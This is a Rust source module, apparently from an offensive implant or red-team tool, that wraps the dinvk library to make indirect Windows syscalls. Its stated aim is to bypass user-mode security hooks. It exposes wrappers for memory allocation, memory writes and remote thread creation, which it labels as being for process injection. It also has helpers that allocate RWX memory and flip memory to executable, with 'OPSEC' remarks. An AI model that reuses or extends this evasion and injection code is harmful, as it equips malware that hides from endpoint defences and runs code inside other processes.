//! Indirect Syscalls usando dinvk
//!
//! Este módulo proporciona syscalls indirectas usando la librería dinvk,
//! que implementa técnicas de DInvoke para evadir hooks de seguridad.
//!
//! Ventajas de usar dinvk:
//! - Librería probada y mantenida por la comunidad
//! - Implementa técnicas avanzadas de evasión (indirect syscalls)
//! - Soporta múltiples versiones de Windows
//! - Resuelve syscall numbers dinámicamente
//! - API limpia y type-safe

#[cfg(target_os = "windows")]
use std::ffi::c_void;

// Re-export dinvk for direct use when needed
#[cfg(target_os = "windows")]
pub use dinvk;

// Import dinvk winapis functions
#[cfg(target_os = "windows")]
use dinvk::winapis::{
    NtAllocateVirtualMemory, NtCreateThreadEx, NtCurrentProcess, NtCurrentThread,
    NtProtectVirtualMemory, NtWriteVirtualMemory,
};

// Re-export commonly used dinvk functions with snake_case names
// for consistency with the rest of the codebase

/// Allocate virtual memory using indirect syscall via dinvk
/// Bypasses usermode hooks by using DInvoke technique
#[cfg(target_os = "windows")]
pub fn nt_allocate_virtual_memory(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    NtAllocateVirtualMemory(
        process_handle,
        base_address,
        zero_bits,
        region_size,
        allocation_type,
        protect,
    )
}

/// Protect virtual memory using indirect syscall via dinvk
#[cfg(target_os = "windows")]
pub fn nt_protect_virtual_memory(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    NtProtectVirtualMemory(
        process_handle,
        base_address,
        region_size,
        new_protect,
        old_protect,
    )
}

/// Write to virtual memory using indirect syscall via dinvk
#[cfg(target_os = "windows")]
pub fn nt_write_virtual_memory(
    process_handle: *mut c_void,
    base_address: *mut c_void,
    buffer: *mut c_void,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> i32 {
    NtWriteVirtualMemory(
        process_handle,
        base_address,
        buffer,
        buffer_size,
        bytes_written,
    )
}

/// Create remote thread using indirect syscall via dinvk
/// Used for process injection techniques
#[cfg(target_os = "windows")]
pub fn nt_create_thread_ex(
    thread_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut dinvk::types::OBJECT_ATTRIBUTES,
    process_handle: *mut c_void,
    start_routine: *mut c_void,
    argument: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut dinvk::types::PS_ATTRIBUTE_LIST,
) -> i32 {
    NtCreateThreadEx(
        thread_handle,
        desired_access,
        object_attributes,
        process_handle,
        start_routine,
        argument,
        create_flags,
        zero_bits,
        stack_size,
        maximum_stack_size,
        attribute_list,
    )
}

/// Get current process handle (-1)
#[cfg(target_os = "windows")]
pub fn nt_current_process() -> *mut c_void {
    NtCurrentProcess()
}

/// Get current thread handle (-2)
#[cfg(target_os = "windows")]
pub fn nt_current_thread() -> *mut c_void {
    NtCurrentThread()
}

/// Check if indirect syscalls are available
/// Always returns true when dinvk is compiled in
#[cfg(target_os = "windows")]
pub fn is_indirect_syscall_available() -> bool {
    true
}

// ============================================================================
// Higher-level helper functions for common operations
// ============================================================================

/// Allocate RWX memory in current process using indirect syscall
/// Returns pointer to allocated memory or null on failure
#[cfg(target_os = "windows")]
pub fn allocate_rwx_memory(size: usize) -> *mut c_void {
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = nt_allocate_virtual_memory(
        nt_current_process(),
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    );

    if status >= 0 {
        base_address
    } else {
        std::ptr::null_mut()
    }
}

/// Allocate RW memory in current process using indirect syscall
/// More OPSEC safe than RWX - change to RX after writing
#[cfg(target_os = "windows")]
pub fn allocate_rw_memory(size: usize) -> *mut c_void {
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = nt_allocate_virtual_memory(
        nt_current_process(),
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE
    );

    if status >= 0 {
        base_address
    } else {
        std::ptr::null_mut()
    }
}

/// Change memory protection to executable using indirect syscall
#[cfg(target_os = "windows")]
pub fn make_memory_executable(address: *mut c_void, size: usize) -> bool {
    let mut base = address;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = nt_protect_virtual_memory(
        nt_current_process(),
        &mut base,
        &mut region_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );

    status >= 0
}
